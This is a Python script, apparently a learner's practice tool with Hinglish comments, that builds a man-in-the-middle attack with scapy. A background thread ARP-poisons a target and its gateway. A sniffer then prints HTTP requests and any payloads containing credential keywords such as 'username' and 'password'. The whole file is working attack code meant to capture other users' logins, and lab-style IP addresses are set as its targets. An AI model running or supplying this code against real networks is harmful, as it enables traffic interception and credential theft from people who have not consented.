import scapy.all as scapy
from scapy.layers import http
import time
import threading

# ==========================================
# PART 1: ARP SPOOFER LOGIC
# ==========================================
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return False
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    return True

# Ye function ek background loop mein chalega
def start_spoofer(target_ip, gateway_ip):
    print(f"[+] Spoofer Thread Started targeting {target_ip}...")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)

# ==========================================
# PART 2: PACKET SNIFFER LOGIC
# ==========================================
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass", "uname", "pwd"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] HTTP Request >> {url.decode()}")
        
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible Username/Password > {login_info}\n\n")

def start_sniffer(interface):
    print(f"[+] Sniffer Thread Started on {interface}...")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# ==========================================
# PART 3: MAIN EXECUTION (MULTITHREADING)
# ==========================================
# APNI IPs YAHAN SET KARO (Jaise kal verify ki thi)
TARGET_IP = "10.0.2.2"   
GATEWAY_IP = "10.0.2.1"  
INTERFACE = "eth0"

print("[*] Initializing MITM Framework...")

try:
    # 1. Spoofer ko background (Thread) mein daalna
    # Technical Term: Thread Instantiation
    spoofer_thread = threading.Thread(target=start_spoofer, args=(TARGET_IP, GATEWAY_IP))
    
    # Daemon=True ka matlab hai jab tum Ctrl+C dabaoge, toh ye background thread bhi auto-kill ho jayega
    spoofer_thread.daemon = True 
    spoofer_thread.start()

    # 2. Sniffer ko main program mein chalana
    start_sniffer(INTERFACE)

except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C ... Shutting down Framework.")
